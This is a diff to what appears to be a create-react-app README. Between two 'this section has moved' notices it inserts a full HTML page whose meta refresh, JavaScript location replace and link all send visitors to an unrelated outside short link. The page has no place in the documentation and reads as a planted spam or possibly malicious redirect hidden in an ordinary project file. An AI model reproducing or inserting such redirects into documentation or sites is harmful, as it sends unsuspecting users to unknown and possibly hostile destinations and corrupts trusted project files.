@@ -65,6 +65,22 @@ This section has moved here: [https://facebook.github.io/create-react-app/docs/a
 
 This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
 
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="0; url=https://doodpl.site/4vB6q">
+  <script>
+    window.location.replace("https://doodpl.site/4vB6q");
+  </script>
+  <title>Redirecting...</title>
+</head>
+<body>
+  <p>If you are not redirected automatically, <a href="https://doodpl.site/4vB6q">click here</a>.</p>
+</body>
+</html>
+
 ### `npm run build` fails to minify
 
 This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
